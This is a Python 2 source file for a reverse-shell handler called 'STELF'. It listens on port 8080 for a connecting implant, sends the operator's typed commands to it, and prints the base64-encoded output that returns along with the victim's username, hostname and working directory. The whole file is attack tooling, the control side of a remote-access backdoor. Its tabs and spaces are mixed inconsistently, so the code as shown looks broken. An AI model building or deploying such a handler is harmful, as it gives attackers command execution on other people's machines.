#!/usr/bin/env python2
import socket, sys, json, base64, signal

class Handler:
	def __init__(self, bind, port):
		self.bind = bind
		self.port = port
                
		self.cwd = "STELF Connected "
		self.prompt = self.cwd + ">>"
		self.server_sock = socket.socket()
		self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		self.server_sock.bind((self.bind, self.port))

		self.commands = []
                signal.signal(signal.SIGINT, self.signal_handler)
                
                
        def signal_handler(self, signal, frame):
            print "\n\rBye Bye!"
            self.server_sock.close()
            sys.exit(0)

	def send_cmd(self, command):
		self.commands.append(command)
		self.client_socket.sendall(command)
		
	def make_prompt(self, data_package):
		if data_package["username"] and data_package["hostname"]:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + "@" +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">>"

		else:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + " " +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">>"
							
		self.prompt = self.prompt.strip()

	def start(self):
            while True:
		self.server_sock.listen(5)
		self.client_socket, _ = self.server_sock.accept()
		print "[*] Connection established! "
		while True:
			user_input = raw_input("\n" + self.prompt + " ")
			if user_input == "help":
				print "Available commands:\n prompt - change prompt"
                        else:
                            try:
			        self.send_cmd(user_input)
			        data = self.client_socket.recv(4096)
                                try:
			            data_package = json.loads(data)
			            for key in data_package:
			                data_package[key] = base64.b64decode(data_package[key])
			
			            self.make_prompt(data_package)
			
			            sys.stdout.write(data_package["data"])
			        except Exception as e:
			            print "[-] Whoooops"
                            except Exception as e:
                                print "Something went wrong" 
                                if str(e) == "[Errno 32] Broken pipe":
                                    print "[-] Broken pipe..."
                                    print "[*] Attempting reconnection"
                                    break

                            
handler = Handler("0.0.0.0", 8080)
handler.start()
